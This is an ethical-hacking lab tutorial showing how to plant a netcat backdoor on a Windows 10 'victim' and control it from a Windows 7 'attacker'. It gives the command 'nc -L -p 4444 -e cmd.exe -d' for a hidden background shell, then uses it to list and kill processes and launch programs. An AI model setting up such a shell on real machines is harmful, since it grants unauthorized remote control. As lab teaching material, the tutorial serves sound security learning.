# Backdoor access with swiss army knife(nc)
Trojans and backdoors are types of malware used to infect and compromise computer systems. Many Trojans are used to manipulate files on the victim computer, manage processes, remotely run commands, intercept keystrokes, watch screen images, and restart or shut down infected hosts.

## Lab Configuration
- Windows-10(victim)
- Windows-7(attacker)
- [netcat](https://nmap.org/ncat/)
- make sure two hosts are in same network

## Netcat
To start connect type following commands in windows-10 command prompt.
```
nc -L -p 4444

```
- nc mean program to run
- L mean listen mode
- p mean listen port number


<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/b0545e46-a604-4da4-9a83-11d48d7479af" width="400px" height="250px"><br>Figure (1) Type text in prompt both machine can see it</p>

In windows-7 command prompt type following commands to connect with windows-10.
```
nc [192.168.100.] 4444

```
- nc mean program to run
- IP mean windows-10 IP
- port number to connect
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/cdefa90b-7055-48dc-98ec-a0e3e66ce919" width="400px" height="250px"><br>Figure (2) Type text in prompt both machine can see it</p>

Now type following commands in windows-10 command prompt.
```
nc -L -p 4444 -e cmd.exe -d

```
- nc mean program to run
- L mean listen mode
- p mean listen port number
- e filename / program to provide
- d mean running in the background

After that, in windows-7 command prompt type following commands to connect with windows-10. ``` nc [192.168.100.] 4444 ```. We got command prompt of windows-10.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/549a9faf-3e03-4daf-a4e9-40c38c1bb9d2" width="400px" height="250px"><br>Figure (3) Command prompt access </p>

Type ``` ipconfig ``` we can get information of windows-10.

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/22a6da17-9af6-4837-bd75-61fde7ef4837" width="400px" height="250px"><br>Figure (4) </p>

Type ``` tasklist ``` to see running process in windows-10. And type ``` taskkill /PID PID of the cmd.exe ```.

- taskkill mean program to kill tasks in windows
- /PID PID is process id of the running program

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/afc39767-0490-477b-8ea8-1005acbd51ee" width="400px" height="250px"><br>Figure (5) </p>

Goes and check in windows-10, cmd.exe is now closed.

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/2784ad17-74fb-4af4-bab8-a356fbab02b4" width="400px" height="250px"><br>Figure (6) </p>

Type ``` start calc ``` to start calculator program.

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/7b6ca409-26b8-48eb-9f70-b832885af3fd" width="400px" height="250px"><br>Figure (7) </p>


Goes and check in windows-10, calculator program is running. What if a malicious program instead of calculator program......

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/fc73aeda-a0dc-4995-b8e9-d2ac31e4d60c" width="400px" height="250px"><br>Figure (8) </p>

## Conclusion 

In this tutorial, backdoor program execution is demostrated with netcat swiss army knife. Do more Practice and Expert it!. <br>
**3/22/2024** <br>
Contributed By - Jord@n
